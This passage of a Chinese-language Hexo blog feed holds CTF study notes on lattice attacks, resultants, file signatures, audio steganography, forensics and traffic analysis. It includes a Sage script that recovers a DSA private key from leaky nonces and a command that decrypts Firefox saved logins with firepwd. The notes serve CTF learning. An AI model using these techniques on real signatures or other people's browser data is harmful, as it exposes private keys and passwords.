title="7.HNP问题（隐藏数问题）"></a>7.HNP问题（隐藏数问题）</h4><ul><li><p><strong>概述：</strong> 以基于DSA为例</p></li><li><p><strong>代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><br>t = <span class="hljs-number">40</span><br><br><span class="hljs-comment"># Load data</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)<br>(q, Hm_s, r_s, s_s) = json.load(f)<br><br><span class="hljs-comment"># Calculate A &amp; B</span><br>A = []<br>B = []<br><span class="hljs-keyword">for</span> r, s, Hm <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(r_s, s_s, Hm_s):<br>    A.append( ZZ( (inverse_mod(s, q)*r) % q ) )<br>    B.append( ZZ( (inverse_mod(s, q)*Hm) % q ) )<br><br><span class="hljs-comment"># Construct Lattice</span><br>K = <span class="hljs-number">2</span>^<span class="hljs-number">122</span>   <span class="hljs-comment"># ki &lt; 2^122</span><br>X = q * identity_matrix(QQ, t) <span class="hljs-comment"># t * t</span><br>Z = matrix(QQ, [<span class="hljs-number">0</span>] * t + [K/q] + [<span class="hljs-number">0</span>]).transpose() <span class="hljs-comment"># t+1 column</span><br>Z2 = matrix(QQ, [<span class="hljs-number">0</span>] * (t+<span class="hljs-number">1</span>) + [K]).transpose()    <span class="hljs-comment"># t+2 column</span><br><br>Y = block_matrix([[X],[matrix(QQ, A)], [matrix(QQ, B)]]) <span class="hljs-comment"># (t+2) * t</span><br>Y = block_matrix([[Y, Z, Z2]])<br><br><span class="hljs-comment"># Find short vector</span><br>Y = Y.LLL()<br><br><span class="hljs-comment"># check</span><br>k0 = ZZ(Y[<span class="hljs-number">1</span>, <span class="hljs-number">0</span>] % q)<br>x = ZZ(Y[<span class="hljs-number">1</span>, -<span class="hljs-number">2</span>] / (K/q) % q)<br><span class="hljs-keyword">assert</span>(k0 == (A[<span class="hljs-number">0</span>]*x + B[<span class="hljs-number">0</span>]) % q)<br><span class="hljs-built_in">print</span>(x)<br></code></pre></td></tr></table></figure></li></ul><h4 id="8-GGH加密"><a href="#8-GGH加密" class="headerlink" title="8.GGH加密"></a>8.GGH加密</h4><ul><li><p><strong>概述：</strong> $c&#x3D;m*B’+e,B’&#x3D;UB$，已知$c,B$，求$m$</p></li><li><p><strong>代码：（Nguyen’s Attack算法）</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Sage</span><br><span class="hljs-comment"># e=mW+r</span><br><span class="hljs-keyword">from</span> sage.modules.free_module_integer <span class="hljs-keyword">import</span> IntegerLattice<br><br>W = <br>e = <br><br>B = W.stack(e).augment(vector([<span class="hljs-number">0</span>] * W.ncols() + [<span class="hljs-number">1</span>]))<br>r = IntegerLattice(B).shortest_vector()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;r = &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(r))<br><br>m = W.solve_left(e - r[:-<span class="hljs-number">1</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;m = &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(m))<br></code></pre></td></tr></table></figure></li></ul><h4 id="9-HLCP-隐线性组合问题"><a href="#9-HLCP-隐线性组合问题" class="headerlink" title="9.HLCP(隐线性组合问题)"></a>9.HLCP(隐线性组合问题)</h4><ul><li><strong>概述：</strong> $w&#x3D;vG$，其中$w,v$为$GF(p)$上的向量，$G$是$0$至$B$之间整数值矩阵。已知$w$，恢复矩阵$G$。</li></ul><h4 id="10-a-iX-i-equiv-b-i-mod-P-S"><a href="#10-a-iX-i-equiv-b-i-mod-P-S" class="headerlink" title="10.$a_iX_i \equiv b_i \mod (P+S)$"></a>10.$a_iX_i \equiv b_i \mod (P+S)$</h4><span>$$(k_1k_2,a_1k_2,a_2k_1,a_1a_2) \\\begin{pmatrix}1 & P & 0 & P^2 \\0 & X_1 & X_1 & X_1P \\0 & 0 & -X_2 & X_2P \\0 & 0 & 0 & X_1X_2\\ \end{pmatrix}\\=(k_1k_2,k_2(b_1-sk_1),b_1k_2-b_2k_1,(b_1-k_1s)(b_2-k_2s)$$</span><span>$$B \approx (P^{2\alpha},P^{2\alpha+\gamma},P^{\alpha+\beta},P^{2\alpha+2\gamma})\\\begin{pmatrix}P^{2\gamma} & 0 & 0 & 0\\0 & P^{\gamma} & 0 & 0 \\0 & 0 & P^{\alpha-\beta+2\gamma} & 0 \\0 & 0 & 0 & 1\\\end{pmatrix}$$</span><p><strong>参考：</strong> </p><p><a href="https://dexterjie.github.io/2023/07/28/%E5%88%9D%E8%AF%86%E6%A0%BC/?highlight=%E6%A0%BC">初识格 | DexterJie’Blog</a></p><p><a href="https://tover.xyz/p/LLL-attack-equation/#%E7%BA%BF%E6%80%A7%E7%BB%84%E5%90%88">格攻击之小未知数方程求解入门——原理与例子 | Tover’s Blog</a></p><p><a href="https://blog.csdn.net/qq_42667481/article/details/118332181">格基规约算法概览-CSDN博客</a></p><p><a href="https://lazzzaro.github.io/2020/11/07/crypto-%E6%A0%BC%E5%AF%86%E7%A0%81/index.html">格密码 | Lazzaro (lazzzaro.github.io)</a></p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>结式与RSA</title>
    <link href="/2025/04/02/%E7%BB%93%E5%BC%8F%E4%B8%8ERSA/"/>
    <url>/2025/04/02/%E7%BB%93%E5%BC%8F%E4%B8%8ERSA/</url>
    
    <content type="html"><![CDATA[<h1 id="Crypto中的结式"><a href="#Crypto中的结式" class="headerlink" title="Crypto中的结式"></a>Crypto中的结式</h1><p>前几天做题遇见了，记录一下。</p><h2 id="结式（resultant）"><a href="#结式（resultant）" class="headerlink" title="结式（resultant）"></a>结式（resultant）</h2><ul><li><p><strong>概念：</strong> 在域中，多项式的结式是Sylvester Matrix的行列式。</p></li><li><p><strong>定义：</strong> 有两个多项式</p></li></ul><span>$$f(x)=\sum_{i=0}^ma_ix^i \\g(x)=\sum_{j=0}^nb_jx^j$$</span>  <p>  构造如下矩阵：</p><span>$$S_{f,g}:=\begin{bmatrix}a_m  & a_{m-1} & \cdots & a_1 & a_0 & & \\ \\& \ddots & \ddots & & \ddots & \ddots\\& & a_m & a_{m-1} & \dots & a_1 & a_0 & \\b_n  & b_{n-1} & \cdots & b_1 & b_0 & & \\ \\& \ddots & \ddots & & \ddots & \ddots\\& & b_n & b_{n-1} & \dots & b_1 & b_0 & \\\end{bmatrix}$$</span>  <p>  其中前$n$行是$f(x)$,后$m$行是$g(x)$</p><p>  该矩阵称为<strong>Sylvester矩阵</strong>，它的<strong>行列式</strong>为 <strong>$res(f,g)$</strong>,称为$f,g$的<strong>结式</strong>。</p><ul><li><p><strong>应用：</strong></p><ul><li><p><strong>判断互素：</strong> 当且仅当$res(f,g)&#x3D;0$时，两多项式存在公共根。</p></li><li><p><strong>消元：</strong> 假设有</p></li></ul></li></ul><span>  $$    \begin{cases}F(x,y)=0 \\G(x,y)=0\end{cases}$$</span>    <p>将$y$视为常数，此时$f(x),g(x)$有公因子，因此令$res(f,g)&#x3D;0$可以解出$y$，再代入原方程便可以解出$x$。代码示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br>R = PolynomialRing(ZZ, <span class="hljs-string">&#x27;x, y&#x27;</span>)<br>f1 =<span class="hljs-comment">#x,y的表达式1</span><br>f2 =<span class="hljs-comment">#x,y的表达式2</span><br>h = f1.sylvester_matrix(f2, y).det()         <span class="hljs-comment">#利用结式消掉y</span><br>roots = h.univariate_polynomial().roots()    <span class="hljs-comment">#求出x</span><br><span class="hljs-built_in">print</span>(roots)<br></code></pre></td></tr></table></figure><p><strong>结合coppersmith方法</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br>n = <br><br>R.&lt;x,y&gt; = PolynomialRing(Zmod(n))<br>f1 =<span class="hljs-comment">#x,y的表达式1</span><br>f2 =<span class="hljs-comment">#x,y的表达式2</span><br><br>h1 = f1.sylvester_matrix(f2, y).det()     <span class="hljs-comment">#利用结式消掉y</span><br>h2 = f2.sylvester_matrix(f1, x).det() <br>x_roots = h1.univariate_polynomial().monic().small_roots(X=<span class="hljs-number">2</span>**<span class="hljs-number">128</span>,beta=<span class="hljs-number">0.4</span>,epsilon=<span class="hljs-number">0.01</span>)<span class="hljs-comment">#求出x</span><br>y_roots = h2.univariate_polynomial().monic().small_roots(X=<span class="hljs-number">2</span>**<span class="hljs-number">128</span>,beta=<span class="hljs-number">0.4</span>,epsilon=<span class="hljs-number">0.01</span>)<br><span class="hljs-built_in">print</span>(x_roots)<br><span class="hljs-built_in">print</span>(y_roots)<br></code></pre></td></tr></table></figure><blockquote><p>参考：<a href="https://tover.xyz/p/resultant-companion-hardrsa/#Resultant">结式、伴随矩阵、特征多项式和2023江苏省数据安全竞赛的hardrsa | Tover’s Blog</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>结式与rsa</tag>
      
      <tag>结式</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件头</title>
    <link href="/2025/04/02/%E6%96%87%E4%BB%B6%E5%A4%B4/"/>
    <url>/2025/04/02/%E6%96%87%E4%BB%B6%E5%A4%B4/</url>
    
    <content type="html"><![CDATA[<h1 id="常见文件头"><a href="#常见文件头" class="headerlink" title="常见文件头"></a>常见文件头</h1><p><strong>png(apng):</strong> <code>89 50 4E 47</code> <code>(‰PNG)</code><br><strong>jpg:</strong> <code>FF D8 FF E0 00 10 4A 46 49 46</code> <code>(ÿØÿà..JFIF)</code><br><strong>gif:</strong><code>47 49 46</code> <code>(GIF)</code><br><strong>bmp:</strong> <code>42 4D</code> <code>(BM)</code><br><strong>bpg:</strong> <code>42 50 47</code> <code>(BPG)</code><br><strong>tiff:</strong> <code>49 49 2A 00</code><br><strong>zip:</strong> <code>50 4B 03 04</code> <code>(PK..)</code><br><strong>7z:</strong> <code>37 7A BC AF 27 1C</code> <code>(7z¼¯&#39;.)</code><br><strong>rar:</strong> <code>52 61 72 21</code> <code>(Rar!)</code><br><strong>doc:</strong> <code>D0 CF 11 E0</code><br><strong>docx:</strong> <code>50 4B 03 04</code> <code>(本质是xml文件压缩包)</code><br><strong>wav:</strong> <code>52 49 46 46</code> <code>(RIFF)</code><br><strong>xml:</strong> <code>3C 3F 78 6D 6C</code> <code>(&lt;?xml)</code><br><strong>html:</strong> <code>68 74 6D 6C 3E</code> <code>(html&gt;)</code></p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MISC音频题</title>
    <link href="/2025/04/02/MISC%E9%9F%B3%E9%A2%91%E9%A2%98/"/>
    <url>/2025/04/02/MISC%E9%9F%B3%E9%A2%91%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="音频题中的古怪"><a href="#音频题中的古怪" class="headerlink" title="音频题中的古怪"></a>音频题中的古怪</h1><h2 id="1-摩斯密码"><a href="#1-摩斯密码" class="headerlink" title="1.摩斯密码"></a>1.摩斯密码</h2><p>放进Audacity中看音频长短，若音频长短分明，且分组明确，大概率是morse</p><h2 id="2-sstv"><a href="#2-sstv" class="headerlink" title="2.sstv"></a>2.sstv</h2><p><strong>对象</strong>：wav<br>慢扫描电视，看另一篇文章。</p><h2 id="3-PT2242"><a href="#3-PT2242" class="headerlink" title="3.PT2242"></a>3.PT2242</h2><p><strong>对象</strong>：wav<br>电单车锁车信号，看另一篇文章。</p><h2 id="4-Steghide隐写"><a href="#4-Steghide隐写" class="headerlink" title="4.Steghide隐写"></a>4.Steghide隐写</h2><p><strong>环境：</strong> kali<br><strong>对象：</strong> 包括jpeg、bmp、wmv、au文件</p><ul><li><p><strong>隐藏数据</strong>：<code>steghide embed -cf &lt;载体文件&gt; -ef &lt;待隐藏文件&gt; -p &lt;密码&gt;</code></p></li><li><p><strong>提取数据</strong>：<code>steghide extract -sf &lt;含隐藏信息的文件&gt; -p &lt;密码&gt;</code></p></li><li><p><strong>查看信息</strong>：<code>steghide info &lt;文件名&gt;</code></p></li></ul><h2 id="5-Silenteye隐写"><a href="#5-Silenteye隐写" class="headerlink" title="5.Silenteye隐写"></a>5.Silenteye隐写</h2><p><strong>对象</strong>：wav<br>使用Silenteye工具解密</p><h2 id="6-Spectrogram（频谱图）"><a href="#6-Spectrogram（频谱图）" class="headerlink" title="6.Spectrogram（频谱图）"></a>6.Spectrogram（频谱图）</h2><p>使用<code>Sonic Visualiser</code> 软件分析。在<code>layer -&gt; Add Peak Frequency Spectrogram</code>中调参数，得到隐藏信息。</p><p>或者直接使用<code>audacity</code>查看频谱。</p><h2 id="7-MP3隐写"><a href="#7-MP3隐写" class="headerlink" title="7.MP3隐写"></a>7.MP3隐写</h2><p><strong>对象</strong>：mp3<br><strong>工具</strong>：<strong>mp3stego</strong><br><strong>操作：</strong> 在<code>decode.exe</code>所在文件中打开cmd，输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">decode.exe -X xxx.mp3 -P pass<br></code></pre></td></tr></table></figure><h2 id="8-MKV文件分离"><a href="#8-MKV文件分离" class="headerlink" title="8.MKV文件分离"></a>8.MKV文件分离</h2><p><strong>介绍：</strong> 多媒体文件格式，通常用于存储视频、音频和字幕等多媒体内容。<br><strong>工具：</strong> MKVToolNi（链接：<a href="https://www.52pojie.cn/thread-1876805-1-1.html">MKV 处理工具(MKVToolNix) v82.0.0 - 吾爱破解 - 52pojie.cn</a>）</p><h2 id="9-Steganographier脚本工具"><a href="#9-Steganographier脚本工具" class="headerlink" title="9.Steganographier脚本工具"></a>9.Steganographier脚本工具</h2><p><strong>项目地址</strong>：<a href="https://github.com/cenglin123/SteganographierGUI">cenglin123&#x2F;SteganographierGUI</a><br><strong>功能</strong>：将文件隐写进MP4&#x2F;MKV文件中<br>隐写文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python Steganographier.py -i <span class="hljs-string">&quot;input.txt&quot;</span> -o <span class="hljs-string">&quot;output.mp4&quot;</span> -p <span class="hljs-string">&quot;password&quot;</span> -t <span class="hljs-string">&quot;mp4&quot;</span> -c <span class="hljs-string">&quot;cover.mp4&quot;</span><br>python Steganographier.py -i <span class="hljs-string">&quot;input.txt&quot;</span> -o <span class="hljs-string">&quot;outputFolder&quot;</span> -p <span class="hljs-string">&quot;password&quot;</span> -t <span class="hljs-string">&quot;mp4&quot;</span> -c <span class="hljs-string">&quot;cover.mp4&quot;</span><br></code></pre></td></tr></table></figure><p>隐写文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python Steganographier.py -i <span class="hljs-string">&quot;inputFolder&quot;</span> -o <span class="hljs-string">&quot;outputFolder&quot;</span> -p <span class="hljs-string">&quot;password&quot;</span> -t <span class="hljs-string">&quot;mp4&quot;</span><br>python Steganographier.py -i <span class="hljs-string">&quot;inputFolder&quot;</span> -o <span class="hljs-string">&quot;output.mp4&quot;</span> -p <span class="hljs-string">&quot;password&quot;</span> -t <span class="hljs-string">&quot;mp4&quot;</span><br></code></pre></td></tr></table></figure><p>解除隐写提取文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python Steganographier.py -i <span class="hljs-string">&quot;input.mp4&quot;</span> -r -p <span class="hljs-string">&quot;password&quot;</span><br></code></pre></td></tr></table></figure><p>若仅指定输入文件，则使用默认设置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python Steganographier.py <span class="hljs-string">&quot;input.txt&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MISC取证</title>
    <link href="/2025/04/02/MISC%E5%8F%96%E8%AF%81/"/>
    <url>/2025/04/02/MISC%E5%8F%96%E8%AF%81/</url>
    
    <content type="html"><![CDATA[<p>工具：vol、DiskGenius、R-Studio、取证大师、FTK、VeraCrypt</p><h2 id="fat文件"><a href="#fat文件" class="headerlink" title="fat文件"></a>fat文件</h2><p>可用VeraCrypt进行挂载</p><p>不同的密码可能进入不同的文件系统</p><h2 id="firefox登陆凭证"><a href="#firefox登陆凭证" class="headerlink" title="firefox登陆凭证"></a>firefox登陆凭证</h2><p>已知<code>key.db、logins.json</code></p><p>可在<code>firepwd</code>文件夹下使用<code>python firepwd.py logins.json</code></p><h2 id="DOS扇区数据"><a href="#DOS扇区数据" class="headerlink" title="DOS扇区数据"></a>DOS扇区数据</h2><p>提取数据为.dat文件后，使用<code>testdisk</code>恢复文件</p><p>一路回车</p><p>Proceed&gt;None&gt;Advanced&gt;Boot&gt;Rebuild BS&gt;List</p><p>选择有特殊数据的文件按c复制到</p><p>文件夹下</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MISC流量分析</title>
    <link href="/2025/04/02/MISC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    <url>/2025/04/02/MISC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="概括"><a href="#概括" class="headerlink" title="概括"></a>概括</h2><ul><li><p>协议分析</p><ul><li><p>HTTP</p></li><li><p>HTTPS</p></li><li><p>FTP</p></li><li><p>DNS</p></li><li><p>WIFI</p></li><li><p>USB</p></li><li><p>VOIP</p></li><li><p>电子邮件协议（SMTP、POP、IMAP、MIME）</p></li></ul></li><li><p>数据提取</p><ul><li><p>字符串提取</p></li><li><p>文件提取</p></li></ul></li><li><p>流量包修复</p></li></ul><h2 id="做题步骤"><a href="#做题步骤" class="headerlink" title="做题步骤"></a>做题步骤</h2><ul><li><p>总体把握</p><ul><li><p>协议分级</p></li><li><p>端点统计</p></li></ul></li><li><p>过滤筛选</p><ul><li><p>过滤语法</p></li><li><p>Host，Protocol，contains，特征值</p></li></ul></li><li><p>发现异常</p><ul><li><p>特殊字符串</p></li><li><p>协议某字段</p></li><li><p>flag位于服务器中</p></li></ul></li><li><p>数据提取</p><ul><li><p>字符串提取</p></li><li><p>文件提取</p></li></ul></li></ul><h2 id="协议分析"><a href="#协议分析" class="headerlink" title="协议分析"></a>协议分析</h2><ul><li><p>概述：计算机网络中进行数据交换而建立的规则、标准或约定的集合。</p></li><li><p>协议分级，WireShark提供了此功能。</p></li></ul><p><img src="/2025/04/02/MISC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/file-20250402195352685.png"></p><ul><li><p>会话，能够显示特定端点IP之间的所有流量。</p></li><li><p>端点，WireShark能列出所有统计的端点信息。</p></li><li><p><strong>HTTP</strong>（超文本传输协议）</p><ul><li>概念：用于分布式、协作式和超媒体信息系统的应用层协议。</li></ul></li><li><p><strong>HTTPS</strong>（&#x3D; HTTP + SSL &#x2F; TLS）</p></li><li><p><strong>FTP</strong>（文件传输协议）</p><ul><li><p>是TCP&#x2F;IP协议组中的协议之一。</p></li><li><p>一、FTP服务器：存储文件</p></li><li><p>二、FTP客户端：用户可使用客户端通过FTP协议访问位于FTP服务器上的资源。</p></li></ul></li><li><p><strong>DNS</strong>（通常称为UDP协议）</p><ul><li>报文格式</li></ul><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+-------------------------------+</span><br><span class="hljs-section">| 报文头                         |</span><br><span class="hljs-section">+-------------------------------+</span><br><span class="hljs-section">| 问题 (向服务器提出的查询部分)    |</span><br><span class="hljs-section">+-------------------------------+</span><br><span class="hljs-section">| 回答 (服务器回复的资源记录)      |</span><br><span class="hljs-section">+-------------------------------+</span><br><span class="hljs-section">| 授权 (权威的资源记录)           |</span><br><span class="hljs-section">+-------------------------------+</span><br><span class="hljs-section">| 额外的 (额外的资源记录)         |</span><br><span class="hljs-section">+-------------------------------+</span><br></code></pre></td></tr></table></figure><p>其中question部分格式为</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs haskell">  <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">2</span>  <span class="hljs-number">3</span>  <span class="hljs-number">4</span>  <span class="hljs-number">5</span>  <span class="hljs-number">6</span>  <span class="hljs-number">7</span>  <span class="hljs-number">8</span>  <span class="hljs-number">9</span>  <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">2</span>  <span class="hljs-number">3</span>  <span class="hljs-number">4</span>  <span class="hljs-number">5</span><br>+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+<br>|                                               |<br>/                     <span class="hljs-type">QNAME</span>                     /<br>/                                               /<br>+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+<br>|                     <span class="hljs-type">QTYPE</span>                     |<br>+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+<br>|                     <span class="hljs-type">QCLASS</span>                    |<br>+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+<br></code></pre></td></tr></table></figure><blockquote><p><strong>QNAME:</strong> 查询的域名，长度可变</p><p><strong>QTYPE:</strong> 查询类型，共16种</p></blockquote></li><li><p><strong>WIFI</strong> </p><blockquote><p>802.11是无线局域网的通用标准。</p></blockquote><p>常见认证方式：</p><ul><li><p>不启用安全</p></li><li><p>WEP</p></li><li><p>WPA&#x2F;WPA2-PSK（预共享密钥）</p></li><li><p>PA&#x2F;WPA2 802.1X（radius认证）</p></li></ul></li><li><p><strong>USB</strong> </p><ul><li><p>鼠标协议</p></li><li><p>键盘协议</p></li></ul></li><li><p><strong>ARP</strong>（地址解析协议）</p><ul><li><p>概念：将网络层地址（如 IP 地址）解析为数据链路层地址（如 MAC 地址）的协议。</p></li><li><p><strong>核心功能：</strong> 广播请求和单播响应</p></li></ul><p>1.APR请求</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sequence">发送方-&gt;局域网: ARP请求（谁有192.168.1.2?）<br>Note over 局域网: 广播ARP请求<br></code></pre></td></tr></table></figure><p>        2.APR响应</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sequence">局域网-&gt;接收方: ARP请求（谁有192.168.1.2?）<br>接收方-&gt;发送方: ARP响应（00:1A:2B:3C:4D:5E）<br>Note over 接收方,局域网: 单播ARP响应<br></code></pre></td></tr></table></figure><p>        3.ARP缓存：发送方在收到ARP响应后，将IP地址和MAC地址映射关系存在ARP缓存中。</p><ul><li><p><strong>TCP</strong>（传输控制协议）</p><ul><li><p><strong>概念：</strong> 位于传输层，提供了可靠的、面向连接的、基于字节流的数据传输服务。</p></li><li><p><strong>特点：</strong> 确保数据在传输过程中不丢失、不重复，按顺序到达。</p></li><li><p><strong>工作原理：</strong></p><ul><li>“<strong>三次握手</strong>”建立连接</li></ul></li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sequence">客户端 -&gt; 服务器: SYN（同步请求）<br>服务器 -&gt; 客户端: SYN-ACK（同步确认）<br>客户端 -&gt; 服务器: ACK（确认）<br>Note over 客户端,服务器: 连接建立，开始数据传输<br></code></pre></td></tr></table></figure><pre><code class="hljs">* **数据传输**  * 序列号、确认号  - 重传机制  - 流量控制  - 拥塞控制* “**四次挥手**”终止连接</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sequence">客户端 -&gt; 服务器 : FIN（结束请求）<br>服务器 -&gt; 客户端 : ACK（确认）<br>服务器 -&gt; 客户端 : FIN（结束请求）<br>客户端 -&gt; 服务器 : ACK（确认）<br></code></pre></td></tr></table></figure><pre><code class="hljs">* **特殊情况：**  - [RST]：立即终止，表示复位或重置</code></pre><ul><li><p><strong>ICMP</strong> （互联网控制消息协议）</p><ul><li><p>是TCP&#x2F;IP协议组中的协议之一。</p></li><li><p>用于诊断网络问题、检测网络可达性、报告错误条件。</p></li><li><p>常见工具如<strong>ping</strong> 、<strong>traceroute</strong> 都依赖于ICMP。</p></li><li><p><strong>常见消息类型：</strong></p><ul><li><p><strong>回显请求（Echo Request）、回显应答（Echo Reply）</strong></p><ul><li>用于<code>ping</code>，检测网络连通性。</li></ul></li><li><p><strong>目的不可达（Destination Unreachable）</strong></p><ul><li>报告原因：如网络不可达、端口不可达。</li></ul></li><li><p><strong>超时（Time Exceeded）</strong></p><ul><li>报告数据包的<code>TTL</code>值耗尽，用于<code>traceroute</code>。</li></ul></li><li><p><strong>重定向（Redirect）</strong></p><ul><li>通知发送方使用更优的路由路径。</li></ul></li></ul></li></ul></li><li><p><strong>VOIP</strong> (基于IP的语音传输)</p><p><strong>网际协议：</strong></p><ul><li><p><strong>会话发起协议（SIP）</strong></p></li><li><p><strong>会话描述协议（SDP）</strong></p></li><li><p><strong>实时传输协议（RTP）</strong></p></li><li><p><strong>H.323</strong></p></li></ul><p><strong>攻击方法：</strong> 抓包后在Wireshark中的”电话 -&gt; Voip”通话中分析。</p></li><li><p><strong>电子邮件协议</strong></p><ul><li><p>SMTP：电子邮件发送协议</p><ul><li>默认端口号：25</li></ul></li><li><p>POP：电子邮件接收协议</p><ul><li>默认端口号：110</li></ul></li><li><p>IMAP：电子邮件接收协议</p><ul><li>默认端口号：143</li></ul></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo+Fulid主题中的Latex渲染问题</title>
    <link href="/2025/04/02/Hexo+Fulid%E4%B8%BB%E9%A2%98%E4%B8%AD%E7%9A%84Latex%E6%B8%B2%E6%9F%93%E9%97%AE%E9%A2%98/"/>
    <url>/2025/04/02/Hexo+Fulid%E4%B8%BB%E9%A2%98%E4%B8%AD%E7%9A%84Latex%E6%B8%B2%E6%9F%93%E9%97%AE%E9%A2%98/</url>
    
